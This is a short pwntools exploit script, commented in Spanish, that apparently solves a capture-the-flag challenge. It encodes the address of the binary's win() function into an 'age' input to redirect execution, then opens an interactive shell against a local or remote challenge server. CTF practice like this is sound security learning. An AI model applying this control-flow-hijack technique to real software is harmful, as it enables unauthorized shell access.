#!/usr/bin/env python3
from pwn import *

# Config
elf = context.binary = ELF('./chal', checksec=False)

def solve(io):
    #Ingresamos el nombre
    io.sendlineafter(b'\n', b'lucas')

    # 2) edad
    # Construimos la edad:
    win = elf.symbols['win']          # 0x4011f6
    age = ((win & 0xFFFFFF) << 8)     # 0x4011f600
    io.sendline(str(age).encode())

    # Si win() hace system("/bin/sh"), ya tenemos interaccion con la shell
    io.interactive()
#Definicion para hacer pruebas locales y remotas
if __name__ == "__main__":
    if args.REMOTE:
        io = remote('challenge.secso.cc', 8001)
    else:
        io = process('./chal')
    solve(io)
